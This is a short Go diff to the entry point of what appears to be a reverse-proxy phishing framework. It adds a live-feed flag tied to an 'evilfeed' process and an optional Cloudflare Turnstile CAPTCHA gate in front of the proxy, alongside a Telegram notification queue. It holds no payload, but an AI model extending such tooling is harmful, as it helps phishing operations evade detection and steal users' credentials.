@@ -8,6 +8,7 @@ import (
 	"os/user"
 	"path/filepath"
 	"regexp"
+	"strings"
 	
 
 	"github.com/caddyserver/certmagic"
@@ -25,6 +26,8 @@ var debug_log = flag.Bool("debug", false, "Enable debug output")
 var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
 var cfg_dir = flag.String("c", "", "Configuration directory path")
 var version_flag = flag.Bool("v", false, "Show version")
+var feed_enabled = flag.Bool("feed", false, "Enable live feed (requires separate evilfeed process on port 1337)")
+var turnstile = flag.String("turnstile", "", "Cloudflare Turnstile sitekey:secretkey to enable CAPTCHA challenge")
 
 // Dashboard flags
 var dashboard_addr = flag.String("dashboard", "0.0.0.0:5000", "Dashboard listen address (set empty to disable)")
@@ -176,7 +179,15 @@ func main() {
 		return
 	}
 
-	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
+	var hp *core.HttpProxy
+	if *turnstile != "" {
+		turnstileParts := strings.Split(*turnstile, ":")
+		hs, _ := core.NewHttpServer(turnstileParts[0], turnstileParts[1], true)
+		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode, *feed_enabled, true)
+		hs.Start(hp)
+	} else {
+		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode, *feed_enabled, false)
+	}
 	hp.Start()
 
 	// Start the Telegram notification queue
